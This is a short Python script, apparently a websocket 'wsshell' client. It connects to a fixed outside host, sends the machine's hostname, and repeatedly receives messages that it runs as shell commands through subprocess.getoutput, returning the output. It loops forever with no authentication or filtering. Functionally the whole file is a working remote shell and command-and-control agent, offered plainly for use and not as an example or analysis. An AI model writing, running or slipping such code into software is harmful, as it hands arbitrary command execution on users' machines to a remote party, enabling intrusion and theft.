#!/usr/bin/env python3
import asyncio
import logging
import platform
import subprocess

import websockets

hostname = platform.uname()[1]
DEFAULT_FORMATTER = '%(asctime)s[%(filename)s:%(lineno)d][%(levelname)s]:%(message)s'
logging.basicConfig(format=DEFAULT_FORMATTER, level=logging.INFO)


async def hello():
    uri = "wss://wsshell.demo666.cn/api.json"
    # uri = 'ws://127.0.0.1:7770/api.json'
    headers = {'hostname': hostname}
    while True:
        try:
            async with websockets.connect(uri, extra_headers=headers) as websocket:
                for _ in range(30):
                    await websocket.send('ping')
                    message = await asyncio.wait_for(websocket.recv(), timeout=10)
                    if message == 'pong':
                        await asyncio.sleep(10)
                        continue
                    if message:
                        logging.info(f'command: {message}')
                        output = subprocess.getoutput(message)
                        await websocket.send(output)
        except asyncio.TimeoutError:
            logging.warning('server timeout.')
        except Exception as e:
            logging.error(e)
            await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(hello())
